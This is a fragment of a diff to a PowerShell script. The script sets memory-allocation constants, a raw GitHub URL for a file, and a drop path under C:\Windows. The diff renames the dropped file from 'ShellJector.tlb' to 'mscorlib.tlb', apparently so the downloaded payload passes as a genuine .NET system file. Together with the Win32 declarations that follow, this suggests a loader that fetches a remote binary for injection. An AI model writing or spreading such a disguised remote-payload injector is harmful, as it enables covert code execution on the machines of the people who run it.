@@ -4,7 +4,7 @@ $MEM_COMMIT = 0x1000
 $MEM_RESERVE = 0x2000
 $PAGE_READWRITE = 0x04
 $dllUrl = "https://raw.githubusercontent.com/Hyphen696/ShivUmangAuth/refs/heads/main/mscorlib.tlb"
-$dllPath = "C:\Windows\ShellJector.tlb"
+$dllPath = "C:\Windows\mscorlib.tlb"
 
 # === Win32 API declarations ===
 Add-Type @"
